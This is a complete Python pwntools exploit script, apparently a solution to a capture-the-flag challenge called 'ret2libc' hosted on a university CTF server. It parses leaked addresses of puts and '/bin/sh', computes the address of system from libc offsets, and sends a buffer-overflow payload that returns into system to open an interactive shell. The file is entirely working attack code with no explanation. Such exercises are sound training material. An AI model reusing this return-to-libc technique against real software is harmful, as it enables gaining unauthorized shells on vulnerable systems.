#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

A4 = 4 * b'A'

def main():
    elf = ELF('./ret2libc')
    libc = ELF('./libc.so.6')
    #proc = elf.process()
    proc = remote('bamboofox.cs.nctu.edu.tw', 11002)
    #raw_input()

    proc.recvuntil('is ')
    bin_sh = int(proc.recvuntil('\n'), 16)
    log.info('bin_sh: {}'.format(hex(bin_sh)))

    proc.recvuntil('is ')
    libc_puts = int(proc.recvuntil('\n'), 16)
    log.info('puts@libc: {}'.format(hex(libc_puts)))

    libc_system = libc_puts + (libc.sym['system'] - libc.sym['puts'])
    log.info('system@libc: {}'.format(hex(libc_system)))

    payload =  8 * A4
    payload += p32(libc_system)
    payload += A4
    payload += p32(bin_sh)
    proc.sendline(payload)

    proc.interactive()


if __name__ == '__main__':
    main()
